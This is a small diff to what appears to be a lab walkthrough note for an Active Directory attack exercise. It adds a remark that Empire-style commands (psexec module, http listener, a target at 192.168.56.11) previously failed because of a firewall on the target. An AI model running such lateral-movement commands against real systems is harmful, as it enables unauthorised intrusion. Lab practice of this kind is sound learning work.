@@ -71,6 +71,7 @@ inject on session for robb.stark
     set Listener http
     execute
 
+    these are the command, before it wasn't working due to firewall on the target machine
     usemodule psexec
     set listener http
     set ComputerName 192.168.56.11
